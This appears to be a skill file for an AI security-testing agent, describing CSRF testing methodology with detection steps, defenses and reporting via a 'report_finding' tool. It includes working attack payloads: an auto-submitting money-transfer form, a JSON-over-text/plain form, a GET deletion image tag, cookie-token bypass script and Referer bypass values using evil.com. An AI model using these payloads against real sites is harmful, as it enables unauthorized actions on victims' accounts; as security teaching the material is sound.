---
name: csrf-testing
description: Professional skills and methodology for CSRF (Cross-Site Request Forgery) testing
version: 1.0.0
---

# CSRF (Cross-Site Request Forgery) Testing

## Overview

CSRF abuses a user's authenticated state to perform unauthorized operations. This skill provides detection, exploitation, and defense methods for CSRF vulnerabilities.

## How it works

- The attacker lures the user into visiting a malicious page
- The malicious page auto-sends a request to the target site
- The browser automatically attaches the user's credentials (cookies, session)
- The target site mistakes it for a legitimate user action

## Testing methodology

### 1. Identify sensitive operations

- Password change
- Email change
- Money transfers
- Permission changes
- Data deletion
- Status updates

### 2. Check for CSRF tokens

**Check whether a token protects the request:**
```html
<!-- Token-protected -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- No token — CSRF risk -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Verify token strength

**Test whether the token is predictable:**
- Is the token timestamp-based?
- Is the token user-ID-based?
- Can the token be reused?
- Is the token shared across requests?

### 4. Check Referer validation

**Test whether Referer checks can be bypassed:**
```javascript
// Normal request
Referer: https://target.com/change-password

// Bypass attempts
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (empty)
```

## Exploitation techniques

### Basic CSRF attack

**Auto-submitting HTML form:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Bypass Content-Type checks:**
```html
<!-- Submit JSON via a form -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GET-request CSRF

**Attack via a GET request:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Bypass techniques

### Token bypass

**If the token is in a cookie:**
```javascript
// If the token exists in both cookie and form
// try submitting only with the cookie
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // no csrf_token parameter — rely on the cookie
});
```

### SameSite cookie bypass

**Abuse subdomains:**
- With SameSite=Lax, GET requests still carry cookies
- Attack via a subdomain

### Double-submit cookie

**Bypass token validation:**
```html
<!-- If the token is in a cookie and validation is flawed -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // Read the token from the cookie
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Tool usage

### Burp Suite

**Use the CSRF PoC generator:**
1. Intercept the target request
2. Right-click → Engagement tools → Generate CSRF PoC
3. Test the generated PoC

### OWASP ZAP

```bash
# CSRF scan with ZAP
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Verification and reporting

### Verification steps

1. Confirm the target operation has no CSRF-token protection
2. Build a malicious request and verify it executes
3. Assess impact (data leakage, privilege escalation, financial loss, etc.)
4. Record a complete PoC
5. Log the confirmed vulnerability via the `report_finding` tool (the platform's sole entry point for recording vulnerabilities), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting essentials

- Vulnerability location and affected operations
- Attack scenario and blast radius
- Complete exploitation steps and PoC
- Remediation advice (CSRF tokens, SameSite cookies, Referer validation, etc.)

## Defenses

### Recommended

1. **CSRF tokens**
   - Unique token per form
   - Token stored in the session
   - Validate token authenticity

2. **SameSite cookies**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Double-submit cookies**
   - Token present in both cookie and form
   - Verify the two match

4. **Referer validation**
   - Verify the Referer is same-origin
   - Handle empty Referers carefully

## Notes

- Test only in authorized environments
- Avoid real impact on user accounts
- Record every testing step
- Account for differences across browsers
